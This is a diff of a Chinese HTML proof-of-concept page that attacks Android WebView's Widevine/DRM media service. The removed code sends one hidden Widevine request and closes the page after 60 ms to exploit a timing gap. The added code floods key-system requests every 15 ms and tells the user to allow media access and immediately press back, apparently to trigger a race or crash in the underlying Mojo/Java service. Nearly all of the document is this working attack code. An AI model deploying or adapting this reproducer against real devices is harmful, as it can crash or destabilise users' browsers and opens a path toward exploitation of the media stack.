@@ -2,44 +2,29 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>正在隐式触发媒体完整性服务...</title>
+    <title>加特林压测模式</title>
 </head>
 <body style="background: #111; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif;">
-    <h3>正在唤醒底层媒体完整性服务...</h3>
-    <p>正在通过标准 EME/Widevine 接口发送安全证书请求</p>
-
-    <!-- 放置一个隐藏的视频元素，强行激活 Blink 媒体解析管线 -->
-    <video id="test-video" width="1" height="1" autoplay loop muted crossorigin="anonymous"></video>
+    <h2 style="color: #FF3B30;">⚠️ 加特林无限轰炸模式已启动 </h2>
+    <p>正在以每 15 毫秒/次的频率轰击底层媒体服务...</p>
+    <p style="color: #FF9500; font-weight: bold; font-size: 18px;">【复现核心操作】</p>
+    <p style="padding: 10px; background: #222; border-radius: 8px; display: inline-block;">
+        1. 如果弹出媒体权限，请点击“允许”<br>
+        2. 点击允许后，立刻、马上、疯狂地按下手机的【返回键】关闭本页面！
+    </p>
 
     <script>
         window.onload = function() {
-            const video = document.getElementById('test-video');
-            
-            // 1. 给视频喂一个大厂常用的 Widevine 加密流媒体地址
-            // 即使链接不可用，Blink 的媒体栈也会在“握手解析阶段”强行启动
-            video.src = "https://storage.googleapis.com/shaka-demo-assets/angel-one-widevine/dash.mpd";
-
-            // 2. 强行向系统请求 Widevine 最高安全级别的媒体密钥
-            // 这一步在 Android WebView 中会直接触发底层的媒体完整性校验（Mojo 调用）
-            if (navigator.requestMediaKeySystemAccess) {
-                navigator.requestMediaKeySystemAccess('com.widevine.alpha', [{
-                    initDataTypes: ['keyids', 'cenc'],
-                    audioCapabilities: [{ contentType: 'audio/mp4; codecs="mp4a.40.2"' }],
-                    videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }],
-                    sessionTypes: ['temporary']
-                }]).then(function(access) {
-                    console.log("DRM 栈初始化成功");
-                }).catch(function(e) {
-                    // 无论成功还是失败，只要请求发出了，底层 Java 服务就已经被唤醒
-                    console.log("DRM 请求已送达底层");
-                });
-            }
-
-            // 3. 关键：给底层 Mojo 消息留出大约 60 毫秒的传输时间
-            // 趁 Java 层正在忙着抓 Profile 的空档，网页立刻执行 window.close() 自杀！
-            setTimeout(function() {
-                window.close();
-            }, 60); 
+            // 用 setInterval 代替 setTimeout，变成无限循环发包
+            setInterval(function() {
+                if (navigator.requestMediaKeySystemAccess) {
+                    // 疯狂发射 Widevine 请求，把底层 Mojo 通道塞满
+                    navigator.requestMediaKeySystemAccess('com.widevine.alpha', [{
+                        initDataTypes: ['cenc'],
+                        videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }]
+                    }]);
+                }
+            }, 15); // 15毫秒一次，高频轰炸
         };
     </script>
 </body>
